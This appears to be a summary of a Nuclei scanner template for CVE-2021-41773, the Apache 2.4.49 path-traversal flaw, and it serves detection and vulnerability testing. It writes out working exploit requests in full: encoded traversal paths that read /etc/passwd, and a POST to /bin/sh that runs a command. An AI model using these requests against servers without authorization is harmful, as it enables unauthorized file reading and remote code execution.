---
cve_id: CVE-2021-41773
template_path: nuclei-templates/http/cves/2021/CVE-2021-41773.yaml
affected_product: Apache 2.4.49
severity: high
authentication: none
external_callback: false
affected_versions: 2.4.49
preconditions: ["files outside document root not protected by \"require all denied\"", "CGI module enabled (for RCE)"]
poc_classification: rce
---

## Vulnerability
Apache HTTP Server 2.4.49 contains a path-normalization flaw (CWE-22) allowing unauthenticated remote path traversal. Crafted URLs (e.g. `/.%2e/%2e%2e/...`) map to files outside the document root. When those files lack a `require all denied` directive, requests succeed, leaking interpreted-file source (CGI scripts) or achieving RCE by traversing to `/bin/sh` under CGI. Affects **only** 2.4.49 (not earlier releases); known exploited in the wild. CVSS 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N). Successful exploitation yields unauthorized file access, data leakage, and remote code execution.

## PoC / Detection
Classification: rce

The template verifies exploitability with three raw requests (stop-at-first-match: true, OR matcher condition):
- `GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd` — detects LFI via regex `root:.*:0:0:`.
- `GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` — additional LFI probe.
- `POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh` (Content-Type application/x-www-form-urlencoded) executing `echo COP-37714-1202-EVC | rev` (reverses to `CVE-2021-41773-POC`) — detects RCE via exact word match `CVE-2021-41773-POC`.

## References
- https://github.com/apache/httpd/commit/e150697086e70c552b2588f369f2d17815cb1782
- https://nvd.nist.gov/vuln/detail/CVE-2021-41773
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
- https://twitter.com/ptswarm/status/1445376079548624899
- https://twitter.com/h4x0r_dz/status/1445401960371429381
- https://github.com/blasty/CVE-2021-41773
